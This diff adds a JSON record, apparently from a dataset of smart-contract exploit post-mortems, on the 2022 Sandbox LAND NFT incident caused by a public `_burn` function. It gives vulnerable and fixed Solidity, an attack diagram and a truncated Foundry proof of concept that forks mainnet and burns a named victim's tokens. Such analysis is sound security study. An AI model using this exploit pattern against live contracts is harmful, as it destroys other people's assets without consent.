@@ -1,0 +1,33 @@
+{
+ "id": "2022__2022-02-14_Sandbox_NFTBurnAccessControl",
+ "source_file": "2022/2022-02-14_Sandbox_NFTBurnAccessControl.md",
+ "title": "The Sandbox — Unauthorized NFT Burn (Public `_burn` Function) Analysis",
+ "date": "2022-02-14",
+ "protocol": "The Sandbox",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "User NFT burn damage (asset destruction rather than monetary loss)",
+ "loss_usd": null,
+ "root_cause": "`_burn(address,address,uint256)` function declared as `public`, allowing anyone to burn another user's NFT",
+ "attack_tx": "Block 14,163,041",
+ "vulnerable_contract": "LAND NFT 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable LAND NFT contract (pseudocode)\ncontract LandToken is ERC1155 {\n\n    //",
+  "❌ _burn declared as public — callable by anyone\n    function _burn(\n        address from,\n        address to,     // destination address (typically ignored during burn)\n        uint256 id\n    ) public {\n        // No ownership check\n        // msg.sender can burn tokens belonging to `from`\n        _balances[id][from] -= 1;\n        emit TransferSingle(msg.sender, from, address(0), id, 1);\n    }\n\n    //",
+  "// ❌ Root cause: `_burn(address,address,uint256)` function declared as `public`, allowing anyone to burn another user's NFT\n    function _burn(address from, address owner, uint256 id) public {  // ❌ Vulnerability\n        require(from == owner, \"not owner\");\n        _owners[id] = 2**160; // cannot mint it again\n        _numNFTPerAddress[from]--;\n        emit Transfer(from, address(0), id);\n    }"
+ ],
+ "code_after": [
+  "✅ Correct pattern\n    function _burn(\n        address from,\n        uint256 id,\n        uint256 amount\n    ) internal override {  //",
+  "✅ internal — cannot be called externally\n        require(\n            from == msg.sender || isApprovedForAll(from, msg.sender),\n            \"ERC1155: caller is not owner nor approved\"\n        );\n        super._burn(from, id, amount);\n    }\n}"
+ ],
+ "steps": [
+  "_numNFTPerAddress(victim) → 2,762",
+  "2,762 → 2,662 (100 burned)"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Check victim's LAND NFT balance\n    │       _numNFTPerAddress(victim) → 2,762\n    │\n    ├─[2] Loop (100 iterations)\n    │       for i in range(100):\n    │           LAND._burn(victim, victim, 3738)\n    │           ↑ Direct call to public function\n    │           No ownership/approval verification\n    │\n    ├─[3] Confirm victim's NFT balance decrease\n    │       2,762 → 2,662 (100 burned)\n    │\n    └─[4] Stolen assets are unrecoverable\n            Burned NFTs cannot be reversed",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface ILand {\n    // ⚡ Key: _burn declared as public, allowing external calls\n    function _burn(address from, address to, uint256 id) external;\n    function _numNFTPerAddress(address owner) external view returns (uint256);\n}\n\ncontract ContractTest is Test {\n    ILand land = ILand(0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a);\n    address attacker = 0x6FB0B915D0e10c3B2ae42a5DD879c3D995377A2C;\n    address victim = 0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C;\n    uint256 constant TOKEN_ID = 3738;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 14_163_041);\n    }\n\n    function testExploit() public {\n        uint256 balanceBefore = land._numNFTPerAddress(victim);\n        emit lo"
+ ]
+}
